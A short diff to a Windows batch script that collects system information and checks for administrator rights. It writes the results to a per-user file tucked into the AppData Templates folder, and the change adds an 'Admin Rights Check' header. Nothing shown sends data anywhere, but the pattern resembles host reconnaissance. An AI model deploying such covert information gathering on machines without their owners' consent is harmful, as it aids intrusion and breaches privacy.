@@ -28,6 +28,8 @@ cscript.exe /nologo osinfo.vbs > "%AppData%\Microsoft\Windows\Templates\%usernam
 echo      =================== >> "%AppData%\Microsoft\Windows\Templates\%username%@%computername%.txt"
 echo      =================== >> "%AppData%\Microsoft\Windows\Templates\%username%@%computername%.txt"
 echo      =================== >> "%AppData%\Microsoft\Windows\Templates\%username%@%computername%.txt"
+echo      Admin Rights Check: >> "%AppData%\Microsoft\Windows\Templates\%username%@%computername%.txt"
+echo      =================== >> "%AppData%\Microsoft\Windows\Templates\%username%@%computername%.txt"
 NET SESSION >nul 2>&1
 IF %ERRORLEVEL% EQU 0 (
     ECHO Administrator PRIVILEGES Detected! >> "%AppData%\Microsoft\Windows\Templates\%username%@%computername%.txt"
